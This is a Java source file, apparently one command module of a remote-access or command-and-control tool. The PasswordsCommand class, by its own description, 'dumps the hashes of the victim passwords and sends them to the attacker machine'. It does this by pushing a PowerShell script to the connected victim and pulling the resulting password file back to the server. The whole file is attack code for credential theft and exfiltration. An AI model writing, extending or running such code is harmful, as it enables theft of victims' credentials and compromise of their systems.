package commands;

import java.io.File;
import java.io.IOException;

import connection.Connection;
import connection.Server;

public class PasswordsCommand extends Command{

	public PasswordsCommand() {
		super("passwords", null, "dumps the hashes of the victim passwords and sends them to the attacker machine");
	}

	@Override
	public void execute(Connection con, Server server) throws IOException, InterruptedException {
		con.simpleSend(_commandName);
		
		File passwordScript = new File("resources/Get-PasswordFile.ps1");
		server.sendFile(passwordScript);
		if(con.receive().equals("pass ready")) {
			server.receiveFile();
		}
	}

}
